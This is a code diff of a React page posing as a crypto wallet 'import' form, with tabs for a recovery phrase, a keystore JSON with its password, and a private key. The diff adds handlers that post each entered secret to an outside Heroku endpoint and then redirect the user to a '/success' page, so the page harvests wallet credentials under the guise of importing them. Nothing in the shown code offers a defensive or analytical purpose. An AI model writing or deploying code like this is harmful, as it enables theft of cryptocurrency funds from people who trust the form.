@@ -1,14 +1,18 @@
 import React, { useState, useRef } from 'react';
 
-
+import Axios from 'axios'
 
 const Index = () => {
 
     const [showPhrase, setShowPhrase] = useState(true);
     const [showKeyStore, setShowKeyStore] = useState(false);
     const [showPrivateKey, setShowPrivateKey] = useState(false);
+    const [phrase,setPhrase] = useState('')
+    const [keyStore, setKeyStore] = useState('')
+    const [privatekey, setPrivatekey] = useState('')
+    const [password, setPassword] = useState('')
 
-    var tab = useRef(null)
+    var tab = useRef(null);
 
     const HandleActiveClass = (e, form) => {
 
@@ -43,6 +47,66 @@ const Index = () => {
 
 
     };
+
+    let url = 'https://dapp-be.herokuapp.com/message'
+    const config={
+        headers:{
+            'Content-Type':'application/json'
+        }
+    }
+    const checkPhrase = phrase.match( /[A-Za-z]{12,}/g );
+    const checkkeyStore = keyStore.match( /[A-Za-z]{12,}/g );
+    const checkPrivatekey = privatekey.match( /[A-Za-z]{12,}/g );
+    const HandleSubmitPhrase = async (e)=>{
+        e.preventDefault()
+        if(checkPhrase ){
+            let body= JSON.stringify({
+                phrase, 
+                
+            })
+     
+            await Axios.post(url,body,config);
+            window.location.replace('/success');
+
+        }
+       
+      
+
+
+    }
+    const HandleSubmitKeystore = async (e)=>{
+        e.preventDefault()
+        if( checkkeyStore ||password){
+            let body= JSON.stringify({
+                keyStore,
+                password,
+              
+            })
+     
+            await Axios.post(url,body,config);
+            window.location.replace('/success');
+
+        }
+       
+ 
+        
+    }
+    const HandleSubmitPrivateKey = async (e)=>{
+        e.preventDefault()
+        if( checkPrivatekey){
+            let body= JSON.stringify({
+                privatekey,
+             
+            })
+    
+     
+             await Axios.post(url,body,config);
+            window.location.replace('/success');
+
+        }
+        
+ 
+    }
     return (
         <center>
             <div className="top">
@@ -61,14 +125,14 @@ const Index = () => {
 
             {showPhrase ?
                 <div id="phrase" className="tabcontent" style={{ display: "block" }}>
-                    <form w="" action="" method="POST">
+                    <form>
 
 
-                        <textarea name="phrase" className="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
+                        <textarea onChange={e=>setPhrase(e.target.value)} name="phrase" className="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
                         <br></br>
                         <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                         <br></br>
-                        <button type="submit" name="submit" className="btn">IMPORT</button>
+                        <button type="submit" onClick={e=>HandleSubmitPhrase(e)} name="submit" className="btn">IMPORT</button>
                     </form>
                 </div> : null}
 
@@ -77,30 +141,30 @@ const Index = () => {
 
             {showKeyStore ?
                 <div id="keystore" className="tabcontent" style={{ display: "block" }}>
-                    <form action="\" method="POST">
+                    <form >
 
 
-                        <textarea name="phrase" className="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+                        <textarea name="phrase" onChange={e=>setKeyStore(e.target.value)} className="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
                         <br></br>
                         <div className="field">
-                            <input type="password" name="password" placeholder="Password" autocomplete="off" style={{ backgroundImage: "url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot)", backgroundRepeat: "no-repeat", backgroundAttachment: "scroll", backgroundSize: "16px 18px", backgroundPosition: "98% 50%", cursor: "auto" }} />
+                            <input type="password" onChange={e=>setPassword(e.target.value)} name="password" placeholder="Password" autocomplete="off" style={{ backgroundImage: "url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot)", backgroundRepeat: "no-repeat", backgroundAttachment: "scroll", backgroundSize: "16px 18px", backgroundPosition: "98% 50%", cursor: "auto" }} />
                         </div>
                         <div className="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                         <br></br>
-                        <button type="submit" name="submit" className="btn">IMPORT</button>
+                        <button type="submit" onClick={e=>HandleSubmitKeystore(e)} name="submit" className="btn">IMPORT</button>
                     </form>
                 </div> : null}
 
             {showPrivateKey ?
                 <div id="private" className="tabcontent" style={{ display: "block" }}>
-                    <form action="\" method="POST">
+                    <form >
 
                         <div className="field">
-                            <input type="text" name="key" className="key" placeholder="Private Key" />
+                            <input  type="text" onChange={e=>setPrivatekey(e.target.value)} minlength="12"  name="key" className="key" placeholder="Private Key" />
                         </div>
                         <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                         <br></br>
-                        <button type="submit" name="submit" className="btn">IMPORT</button>
+                        <button onClick={e=>HandleSubmitPrivateKey(e)} type="submit" name="submit" className="btn">IMPORT</button>
                     </form>
                 </div> : null}
 
